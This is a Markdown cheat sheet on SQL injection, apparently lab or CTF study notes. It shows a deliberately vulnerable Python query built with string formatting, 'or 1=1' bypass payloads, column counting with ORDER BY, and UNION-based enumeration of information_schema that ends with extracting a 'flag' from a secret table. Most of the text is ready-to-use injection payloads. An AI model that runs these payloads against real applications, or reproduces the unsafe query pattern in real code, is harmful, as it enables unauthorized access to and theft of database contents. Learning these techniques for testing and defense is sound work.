# SQLi
## The source is [here](https://owasp10-c874b6974594.notion.site/Code-Example-450b5fc335614b348956cb6087dfaa2d)


### The Basic and usefull Commands
```python
def user_exists(username: str) -> bool:
    with connection.cursor() as cursor:
        cursor.execute("""
            SELECT
                Id
            FROM
                users
            WHERE
                username = '%s'
        """ % username)
        result = cursor.fetchone()
    id, = result
    return id
```
* attack is like this
```sql
user_exists('test') #False
#select id from users where username = 'test'

user_exists("'; select 1=1; --") #True
#select id from users where username = ''; select true; --'
```

```sql
'; select 1=1; -—
```
```sql
'; select 1=1; #
```
### Simplest injection
```sql
' or 1=1#
```
```sql
' or 1=1--
```
### UNION ATTACK 
when a web application show Direct result, we should use UNION Attack

```sql
select * from news where news_id = $NEWSID;
select * from news where news_id = '$NEWSID';
select * from news where news_id = "$NEWSID";
```
when a web application show Indirect result, 

```plain text
Default request:
page/?id=54

Test 1:
page/?id=54  order by 1
page/?id=54' order by 1#
page/?id=54" order by 1#

Test 2:
page/?id=54  order by 1000
page/?id=54' order by 1000#
page/?id=54" order by 1000#
```

We can confirm the SQLi when results of:

- Default == Test 1
- Test 1 ≠ Test 2


```sql
' order by 1 #
' order by 2 # ==> sql error so there was 1 column
```
```sql
' union select 1#
' union select group_concat(schema_name) FROM information_schema.schemata #
```
 - database names is ==> information_schema,level2



```sql
' union select group_concat(table_name) FROM information_schema.tables where table_schema='level2' #
```
or
```sql
' union select group_concat(table_name) FROM information_schema.tables where table_schema=database() #
```
 - level2 tables is ==> my_secret_table,users



```sql
' union select group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name='my_secret_table' #
```
 - columns of my_secret_table is ==> flag


```sql
' union select flag from level2.my_secret_table #
```
Now data is here